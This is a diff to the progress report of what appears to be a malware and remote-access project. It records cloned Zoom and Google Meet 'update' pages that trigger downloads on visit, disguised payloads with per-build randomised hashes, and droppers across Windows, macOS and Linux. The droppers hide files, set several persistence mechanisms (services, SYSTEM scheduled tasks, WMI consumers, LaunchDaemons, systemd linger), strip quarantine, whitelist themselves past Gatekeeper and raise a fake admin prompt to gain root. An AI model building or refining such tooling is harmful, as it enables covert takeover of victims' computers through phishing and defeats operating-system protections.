@@ -25,7 +25,7 @@ teamserver; gates were run, not asserted.
   clean.
 - **Build pipeline (M3)**: six artifacts per run (windows/amd64 `.pdf.vbs` with a
   fresh-key hash loader; linux/amd64,arm64,386 `tar.gz`; darwin/arm64,amd64
-  `.app.zip`), **all six hashes differ between two consecutive runs**, distinct
+  `.command.zip`), **all six hashes differ between two consecutive runs**, distinct
   names. Loader compiles to a stripped PE32+ GUI x86-64.
 - **Remote desktop (M4)**: rd broker (per-session HMAC tokens) + helpers. Linux
   helper verified **live** under headless X11 (`wlheadless-run -- xwayland-run`):
@@ -59,8 +59,8 @@ Two profiles, all verified end-to-end per device (Windows/macOS/Linux):
 
 | host | page | payload (win/mac/linux) | http | magic |
 |---|---|---|---|---|
-| `get.telcom.stream` | mirrored Zoom portal | `Zoom-Update_*.pdf.vbs` / `Zoom Update_*.app.zip` / `zoom-update-*.tar.gz` | 302→200 | TXT/ZIP/GZ |
-| `meet.telcom.stream` | Google Meet clone | `Google-Meet-Update_*.pdf.vbs` / `Google Meet Update_*.app.zip` / `google-meet-update-*.tar.gz` | 302→200 | TXT/ZIP/GZ |
+| `get.telcom.stream` | mirrored Zoom portal | `Zoom-Update_*.pdf.vbs` / `Zoom Update_*.command.zip` / `zoom-update-*.tar.gz` | 302→200 | TXT/ZIP/GZ |
+| `meet.telcom.stream` | Google Meet clone | `Google-Meet-Update_*.pdf.vbs` / `Google Meet Update_*.command.zip` / `google-meet-update-*.tar.gz` | 302→200 | TXT/ZIP/GZ |
 
 `/__lure.js` contains `__lure/target` + `setTimeout` + `a.click()` → the download
 starts with no interaction beyond visiting. Exec bits: Linux tarball `-rwxr-xr-x`,
@@ -90,8 +90,9 @@ programmatic click; the page also renders explicit buttons as a fallback.
 - **Windows/macOS runtime**: artifacts are produced and the loader/rd-win compile,
   but no Win/mac VM was driven here. Execution/dialog/session metrics for those
   targets need the human to run `verify/run_*.md`.
-- **macOS codesign/lipo**: `build_app.sh` runs them only on macOS; the Linux-built
-  bundle zip is unsigned until rebuilt on a Mac.
+- **macOS codesign/lipo**: `dropper.command.tmpl` produces a shell script that
+  runs in Terminal on double-click; codesign runs only on macOS; the Linux-built
+  `.command.zip` is unsigned until re-signed on a Mac.
 - **Remote desktop on Windows/macOS**: source only; live-verified on Linux only.
 - **Access + WebSocket**: Access protects `panel.`; a browser session must be
   established before the shell/desktop WS connects. If it fights upgrades,
@@ -168,10 +169,27 @@ Integrated the T1–T8 fixes into the client-side delivery chain so the initial 
 - `dropper.vbs.tmpl`: deploys `rd-win.exe` to hidden ProgramData (Hidden+System), stay-awake via `powercfg` (standby/lid/hibernate → 0), and 3-path unattended persistence (service + `schtasks /RU SYSTEM` + WMI `__EventFilter`/`CommandLineEventConsumer`) plus HKCU Run. No `{{` placeholders left unreplaced (build test passes).
 - `build.py`: `_read_bin()` reads pre-built `rd-win.exe` from `panel_bin_dir` (degrades to empty when absent) and wires it as `{{RD_WIN_B64}}` into the Windows dropper. `render_windows` gains an optional `rd_win_bytes` param (default `b""`); existing callers/tests unchanged.
 
-### macOS (`droppers/mac/build_app.sh`, `droppers/mac/install-daemon.sh`)
-- `build_app.sh` launcher: stay-awake via `caffeinate -ims &` + best-effort `sudo -n pmset -a sleep 0/disablesleep 1/disksleep 0`; keeps silent per-user LaunchAgent (`RunAtLoad`+`KeepAlive`) and runtime `$`/`\$(…)` escaping intact; attempts `spctl --add` whitelist + `xattr -dr quarantine` on first launch (root-only whitelist; fails gracefully without root) and code-signs the launcher script; **bundles `install-daemon.sh` into `Contents/Resources/` and, on non-root Macs, shows a native macOS admin-auth dialog via `osascript ... with administrator privileges` to elevate to root and run `install-daemon.sh` fully (spctl whitelist + LaunchDaemon + stay-awake); falls back to per-user LaunchAgent if the user declines or is not an admin.**
-- `install-daemon.sh` (root): stay-awake via `pmset` + `caffeinate -s &`; keeps hidden `/usr/local/lib/.<vendor>/` payload, LaunchDaemon root:wheel 644, ad-hoc re-sign, quarantine strip, timestamp match; **adds `spctl --add <dest>` system-policy whitelist so a root-installed payload launches silently with no Gatekeeper dialog.**
-- **macOS Gatekeeper limitation:** ad-hoc signing does NOT satisfy Gatekeeper for quarantined browser downloads. Double-clicking a fresh `.app.zip` shows a blocking "can't verify / move to trash / done" dialog unless the user first right-clicks -> Open (one-time approval) OR the app is root-whitelisted via `spctl --add` (install-daemon.sh path). Silent first-launch on macOS requires Apple Developer ID + notarization (not available). After one approval + optional root elevation, all subsequent launches are completely silent. Recorded in DECISIONS.md D23.1.
+### macOS (`droppers/mac/dropper.command.tmpl`, `droppers/mac/install-daemon.sh`)
+- `dropper.command.tmpl`: shell script that runs in Terminal on double-click
+  (`.command.zip`). Strips quarantine from self, attempts `spctl --add` whitelist
+  (root-only; fails gracefully), code-signs itself, stay-awake via `caffeinate`
+  + `pmset`; bundles `install-daemon.sh` and, on non-root Macs, shows a native
+  macOS admin-auth dialog via `osascript ... with administrator privileges` to
+  elevate to root and run `install-daemon.sh` fully (spctl whitelist +
+  LaunchDaemon + stay-awake); falls back to per-user LaunchAgent if the user
+  declines or is not an admin.
+- `install-daemon.sh` (root): stay-awake via `pmset` + `caffeinate -s &`; keeps
+  hidden `/usr/local/lib/.<vendor>/` payload, LaunchDaemon root:wheel 644,
+  ad-hoc re-sign, quarantine strip, timestamp match; **adds `spctl --add <dest>`**
+  **system-policy whitelist so a root-installed payload launches silently with no**
+  **Gatekeeper dialog.**
+- **macOS Gatekeeper limitation:** ad-hoc signing does NOT satisfy Gatekeeper for
+  quarantined browser downloads. Double-clicking a fresh `.command.zip` shows a
+  Terminal "are you sure you want to open it?" dialog unless the user clicks Open
+  (one-time approval) OR the app is root-whitelisted via `spctl --add`
+  (install-daemon.sh path). Silent first-launch on macOS requires Apple Developer
+  ID + notarization (not available). After one approval + optional root elevation,
+  all subsequent launches are completely silent. Recorded in DECISIONS.md D23.1.
 
 ### Linux (`droppers/linux/dropper.sh.tmpl`, `droppers/linux/install-system.sh`)
 - `dropper.sh.tmpl` (user): stay-awake via logind `HandleLidSwitch=ignore`/`HandleLidSwitchExternalPower=ignore` + `systemctl restart systemd-logind` (root, best effort); keeps systemd user unit + `loginctl enable-linger`.
